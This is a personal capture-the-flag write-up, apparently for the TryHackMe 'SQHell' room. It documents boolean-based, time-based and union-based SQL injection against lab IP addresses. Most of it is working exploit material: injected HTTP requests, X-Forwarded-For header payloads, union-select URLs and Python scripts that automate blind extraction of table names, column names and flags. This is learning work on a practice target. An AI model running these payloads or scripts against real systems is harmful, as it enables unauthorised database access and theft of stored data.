---
title: SQHell
tags:
  - fetus
---
## flag 1:
## flag 2:
## flag 3:
## flag 4:
## flag 5:



## boolean based SQLi on `/register/user-check?username=admin`: 
- request:
```
GET /register/user-check?username=admin' AND (length(database())) = 8 --+ HTTP/1.1
Host: 10.10.239.223
X-Requested-With: XMLHttpRequest
Accept-Language: en-US,en;q=0.9
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Referer: http://10.10.239.223/register
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```
- response: 
```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 07 Apr 2025 12:42:48 GMT
Content-Type: application/json
Connection: keep-alive
Content-Length: 19

{"available":false}
```
- tells us the DB name is 8 characters long
- gonna get the DB name now with this: 
```
GET /register/user-check?username=admin' AND (ascii(substr((select database()),Data_offset,1))) = 'ascii values'--+
```

sqhell 
offset 1,1
s = 115

115 = s
113 = q
104 = h
101 = e

- burp setup:
![[SQHell burp1.png]]
![[SQHell burp2.png]]
![[SQHell burp3.png]]
- results after filtering for false:
![[SQHell burpClusterBombResults.png]]
- after cross referencing it with an ASCII table, the DB name turns out to be `sqhell_3` 
- tried to convert the python script to something in http but clearly didnt work cuz o dont know how to write proper http stuff **yet**. ill just use the python script. oh and also heres a peek at what i tried to do:
![[SQHell failedAttempt.png]]
- used a modified version of [[SQHellPythonScript1]]. given below:
```py fold title:"mSkibidi.py"
import requests

import string

  

server = "10.10.239.223"  # Change this to the actual IP or domain

  

def get_result(payload):

    url = f"http://{server}/register/user-check?username=admin' AND ({payload}) --+"

    response = requests.get(url)

    return 'false' in response.text  # Adjust this if the true condition is different

  

# 1. Find Current Database Name

db_name = "sqhell_3"

i = 1

  

print(f"\nDatabase Name: {db_name}")

  

# 2. Find Table Names

table_names = []

for table_index in range(0, 10):  # Adjust the range if needed

    table_name = ""

    i = 1

    while True:

        found = False

        for char in string.printable:

            if char in ("'", '\\'):

                continue

            payload = f"ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema='{db_name}' LIMIT {table_index},1),{i},1))={ord(char)}"

            if get_result(payload):

                table_name += char

                print(f"Finding Table[{table_index}]: {table_name}", end="\r")

                i += 1

                found = True

                break

        if not found:

            break

    if table_name:

        table_names.append(table_name)

    else:

        break

  

print(f"\nTables: {table_names}")

  

# 3. Find Column Names for Each Table

columns = {}

for table in table_names:

    columns[table] = []

    for col_index in range(0, 10):  # Adjust the range if needed

        column_name = ""

        i = 1

        while True:

            found = False

            for char in string.printable:

                if char in ("'", '\\'):

                    continue

                payload = f"ASCII(SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name='{table}' LIMIT {col_index},1),{i},1))={ord(char)}"

                if get_result(payload):

                    column_name += char

                    print(f"Finding Column[{col_index}] in Table[{table}]: {column_name}", end="\r")

                    i += 1

                    found = True

                    break

            if not found:

                break

        if column_name:

            columns[table].append(column_name)

        else:

            break

  

print(f"\nColumns: {columns}")
```
- got two tables:
	- `flag`
		- got two columns:
			- `flag`
			- `id`
			- 
	- `users`
		- got 3 columns:
			- `id`
			- `password`
			- `username`
- an image of the output cuz why not:
![[SQHellPyOutput1.png]]

- another python script to get the flag column from the flag table:
```py fold title:"skibidi2.py"
import requests  
import string  
  
server = "10.10.239.223" # IP OR SERVERNAME   
flag = ""  
loop = 1  
  
while chr(125) not in flag:  
    for a in range(48,126):  
        req = requests.get("http://" + server + f"/register/user-check?username=admin' AND (ASCII(SUBSTR((SELECT flag FROM sqhell_3.flag),{loop},1))) = '{a}'; --+")  
        if 'false' in req.text:  
             flag += chr(a)  
             loop += 1  
             print("Finding Flag: ", flag, end="\r")  
             break  
print("Flag found: ", flag)
```
- ran it 
- flag found yaay
```
Flag found:  THM{FLAG3:97AEB3B28A4864416718F3A5FAF8F308}
```


## time based SQLi at `http://10.10.239.142/terms-and-conditions` with the http header

```
X-Forwarded-For:1' AND (SELECT sleep(5) FROM flag where (ASCII(SUBSTR(flag,2,1))) = '72'); --+
```

```
message = ""

  

with open("data.txt") as f:

    for line in f:

        parts = line.strip().split('\t')

        if len(parts) > 4 and parts[4].isdigit() and int(parts[4]) > 5000:

            ascii_val = int(parts[2])

            message += chr(ascii_val)

            # print(chr(ascii_val))

            # print("flag:   ", message)

  

print("Decoded message:", message)
```

```
import requests

import time

import string

  

server = "10.10.239.142"  # IP or server name

  

# Function to send the request and check the result

def get_result(payload, sleep_time=3, retries=3):

    url = f"http://{server}"

    headers = {'X-Forwarded-For': payload}

    success_count = 0

    for _ in range(retries):

        try:

            start = time.time()

            response = requests.get(url, headers=headers, timeout=sleep_time + 3)

            end = time.time()

            if end - start >= sleep_time - 0.5:  # Slight flexibility for network delay

                success_count += 1

        except requests.exceptions.RequestException:

            pass

  

    # Majority voting - return True if at least half the attempts succeed

    return success_count >= (retries // 2 + 1)

  
  

## 1. Find Table Names of CurrentDB

table_names = []

for table_index in range(0, 10):

    table_name = ""

    i = 1

    while True:

        found = False

        for char in string.printable:

            if char in ("'", '\\'):  # Skip problematic characters

                continue

            payload = f"1' AND (SELECT sleep(3) FROM (SELECT table_name FROM information_schema.tables WHERE table_schema = database() LIMIT {table_index},1) AS tbl WHERE ASCII(SUBSTR(tbl.table_name,{i},1))={ord(char)}); --++"

            if get_result(payload):

                table_name += char

                print(f"Finding Table[{table_index}]: {table_name}", end="\r")

                i += 1

                found = True

                break

        if not found:

            break

    if table_name:

        table_names.append(table_name)

    else:

        break

print(f"\nTables: {table_names}")

  
  

# 2. Find Column Names for Each Table

columns = {}

for table in table_names:

    columns[table] = []

    for col_index in range(0, 10):

        column_name = ""

        i = 1

        while True:

            found = False

            for char in string.printable:

                if char in ("'", '\\'):  # Skip problematic characters

                    continue

                payload = f"1' AND (SELECT sleep(3) FROM (SELECT column_name FROM information_schema.columns WHERE table_name='{table}' LIMIT {col_index},1) AS col WHERE ASCII(SUBSTR(col.column_name,{i},1))={ord(char)}); --+"

                if get_result(payload):

                    column_name += char

                    print(f"Finding Column[{col_index}] in Table[{table}]: {column_name}", end="\r")

                    i += 1

                    found = True

                    break

            if not found:

                break

        if column_name:

            columns[table].append(column_name)

        else:

            break

print(f"\nColumns: {columns}")
```

```
import requests

import time

import string

  

server = "10.10.239.142"  # IP or server name

flag = ""

loop = 1

url = f"http://{server}"

  

# Function to send the request and check the result

def get_result(payload):

    headers = {'X-Forwarded-For': payload}

    try:

        start = time.time()

        response = requests.get(url, headers=headers, timeout=5)

        end = time.time()

        return end - start >= 2  # Return whether the response took longer than 2 seconds

    except requests.exceptions.RequestException:

        return False  # If request fails, return False

  

# Main loop to extract the flag

while chr(125) not in flag:

    for char in string.printable:

        if char in ("'", '\\'):  # Skip problematic characters

            continue

        payload = f"1' AND (SELECT sleep(5) FROM flag WHERE ASCII(SUBSTR(flag,{loop},1)) = {ord(char)}); --+"

        if get_result(payload):

            flag += char

            loop += 1

            print(f"Finding Flag: {flag}", end="\r")

            break

  

print(f"\nFlag found: {flag}")
```
---





='select * from table where user='test' or '1' = '1' ' and password="awfawf"'

http://10.10.239.142/post?id=1

http://10.10.239.142/post?id=-1 union select 1,concat("flag:   ", flag, "    ID:    ", id),3,4 from flag

db name: sqhell_5
table name: flag, posts, users, 
columns: id, flag
http://10.10.239.142/user?id=-2 union select "1 union select 1,concat(flag),3,4 from flag",2,3 from users

- DB
	- TABLE1
		- COLUMN1 
		- COLUMN2 
			- DATA
	- TABLE2



http://10.10.130.138/user?id=-2 union select "1 union select 1,concat(flag),3,4 from flag",2,3 from users


def concat():
	return "test"
print(concat())


